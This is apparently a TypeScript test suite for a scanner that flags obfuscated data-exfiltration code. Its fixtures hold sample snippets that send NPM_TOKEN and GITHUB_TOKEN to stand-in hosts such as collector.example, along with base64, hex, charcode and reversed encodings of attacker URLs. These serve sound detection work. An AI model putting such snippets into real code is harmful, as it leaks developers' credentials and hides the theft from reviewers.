import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeContent } from './analyzer.js';

function patternIdsFor(source: string): string[] {
  return analyzeContent(source).findings.map((finding) => finding.patternId);
}

test('detects base64 encoded HTTPS exfiltration URLs with atob', () => {
  const ids = patternIdsFor(`
    const u = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvY29sbGVjdA==");
    fetch(u, { method: "POST", body: process.env.NPM_TOKEN });
  `);

  assert.ok(ids.includes('EXFIL_BASE64_URL'));
});

test('detects base64 encoded HTTP exfiltration URLs with Buffer.from', () => {
  const ids = patternIdsFor(`
    const endpoint = Buffer.from("aHR0cDovL2NvbGxlY3Rvci5leGFtcGxlL2E=", "base64").toString();
    request(endpoint);
  `);

  assert.ok(ids.includes('EXFIL_BASE64_URL'));
});

test('detects hex encoded HTTPS exfiltration URLs in JavaScript', () => {
  const ids = patternIdsFor(`
    const target = Buffer.from("68747470733a2f2f6576696c2e6578616d706c652f6c6f67", "hex").toString();
    fetch(target);
  `);

  assert.ok(ids.includes('EXFIL_HEX_URL'));
});

test('detects hex encoded HTTPS exfiltration URLs in Python', () => {
  const ids = patternIdsFor(`
    import bytes
    target = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c652f737465616c")
  `);

  assert.ok(ids.includes('EXFIL_HEX_URL'));
});

test('detects JavaScript charcode URL construction', () => {
  const ids = patternIdsFor(`
    const url = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 118, 105, 108);
  `);

  assert.ok(ids.includes('EXFIL_CHARCODE_URL'));
});

test('detects Python chr URL construction', () => {
  const ids = patternIdsFor(`
    url = chr(104) + chr(116) + chr(116) + chr(112) + chr(115) + chr(58)
  `);

  assert.ok(ids.includes('EXFIL_CHARCODE_URL'));
});

test('detects reversed HTTPS URLs', () => {
  const ids = patternIdsFor(`
    const endpoint = "moc.elpmaxe.live//:sptth".split("").reverse().join("");
  `);

  assert.ok(ids.includes('EXFIL_REVERSED_URL'));
});

test('detects encoded npm token exfiltration', () => {
  const ids = patternIdsFor(`
    const token = Buffer.from(process.env.NPM_TOKEN).toString("base64");
    fetch("https://collector.example/log", { method: "POST", body: token });
  `);

  assert.ok(ids.includes('EXFIL_OBFUSCATED_ENV_SEND'));
});

test('detects encoded GitHub token exfiltration before outbound request', () => {
  const ids = patternIdsFor(`
    fetch(endpoint, { body: btoa(process.env.GITHUB_TOKEN) });
  `);

  assert.ok(ids.includes('EXFIL_OBFUSCATED_ENV_SEND'));
});

test('does not flag benign base64 image data or public config', () => {
  const ids = patternIdsFor(`
    const logo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA";
    const apiUrl = process.env.PUBLIC_API_URL;
  `);

  assert.equal(ids.includes('EXFIL_BASE64_URL'), false);
  assert.equal(ids.includes('EXFIL_OBFUSCATED_ENV_SEND'), false);
});
